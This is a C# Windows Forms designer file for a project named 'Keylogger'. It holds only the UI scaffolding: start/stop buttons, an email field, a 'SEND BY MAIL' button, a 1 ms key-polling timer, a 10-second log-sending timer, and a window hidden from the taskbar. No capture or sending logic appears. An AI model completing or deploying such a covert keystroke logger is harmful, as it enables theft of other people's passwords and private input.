namespace Keylogger
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.buttonStart = new System.Windows.Forms.Button();
            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
            this.key = new System.Windows.Forms.Timer(this.components);
            this.log = new System.Windows.Forms.Timer(this.components);
            this.buttonStop = new System.Windows.Forms.Button();
            this.buttonSendLog = new System.Windows.Forms.Button();
            this.timerSendLog = new System.Windows.Forms.Timer(this.components);
            this.textBoxMail = new System.Windows.Forms.TextBox();
            this.SuspendLayout();
            // 
            // buttonStart
            // 
            this.buttonStart.BackColor = System.Drawing.Color.Lavender;
            this.buttonStart.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buttonStart.Location = new System.Drawing.Point(29, 25);
            this.buttonStart.Name = "buttonStart";
            this.buttonStart.Size = new System.Drawing.Size(79, 35);
            this.buttonStart.TabIndex = 0;
            this.buttonStart.Text = "START";
            this.buttonStart.UseVisualStyleBackColor = false;
            this.buttonStart.Click += new System.EventHandler(this.buttonStart_Click);
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            this.notifyIcon1.BalloonTipText = ".";
            this.notifyIcon1.BalloonTipTitle = ".";
            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
            this.notifyIcon1.Visible = true;
            this.notifyIcon1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.notifyIcon1_MouseDoubleClick);
            // 
            // key
            // 
            this.key.Enabled = true;
            this.key.Interval = 1;
            this.key.Tick += new System.EventHandler(this.key_Tick);
            // 
            // log
            // 
            this.log.Interval = 1;
            this.log.Tick += new System.EventHandler(this.log_Tick);
            // 
            // buttonStop
            // 
            this.buttonStop.BackColor = System.Drawing.Color.Lavender;
            this.buttonStop.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold);
            this.buttonStop.Location = new System.Drawing.Point(29, 78);
            this.buttonStop.Name = "buttonStop";
            this.buttonStop.Size = new System.Drawing.Size(79, 36);
            this.buttonStop.TabIndex = 1;
            this.buttonStop.Text = "STOP";
            this.buttonStop.UseVisualStyleBackColor = false;
            this.buttonStop.Click += new System.EventHandler(this.buttonStop_Click);
            // 
            // buttonSendLog
            // 
            this.buttonSendLog.BackColor = System.Drawing.Color.Lavender;
            this.buttonSendLog.Font = new System.Drawing.Font("Calibri", 11.25F, System.Drawing.FontStyle.Bold);
            this.buttonSendLog.Location = new System.Drawing.Point(181, 72);
            this.buttonSendLog.Name = "buttonSendLog";
            this.buttonSendLog.Size = new System.Drawing.Size(79, 49);
            this.buttonSendLog.TabIndex = 3;
            this.buttonSendLog.Text = "SEND BY MAIL";
            this.buttonSendLog.UseVisualStyleBackColor = false;
            this.buttonSendLog.Click += new System.EventHandler(this.buttonSendLog_Click);
            // 
            // timerSendLog
            // 
            this.timerSendLog.Enabled = true;
            this.timerSendLog.Interval = 10000;
            this.timerSendLog.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // textBoxMail
            // 
            this.textBoxMail.Location = new System.Drawing.Point(124, 33);
            this.textBoxMail.Name = "textBoxMail";
            this.textBoxMail.Size = new System.Drawing.Size(186, 20);
            this.textBoxMail.TabIndex = 4;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(343, 132);
            this.Controls.Add(this.textBoxMail);
            this.Controls.Add(this.buttonSendLog);
            this.Controls.Add(this.buttonStop);
            this.Controls.Add(this.buttonStart);
            this.MaximumSize = new System.Drawing.Size(812, 300);
            this.Name = "Form1";
            this.ShowInTaskbar = false;
            this.Text = "Form1";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button buttonStart;
        private System.Windows.Forms.NotifyIcon notifyIcon1;
        private System.Windows.Forms.Timer key;
        private System.Windows.Forms.Timer log;
        private System.Windows.Forms.Button buttonStop;
        private System.Windows.Forms.Button buttonSendLog;
        private System.Windows.Forms.Timer timerSendLog;
        private System.Windows.Forms.TextBox textBoxMail;
    }
}

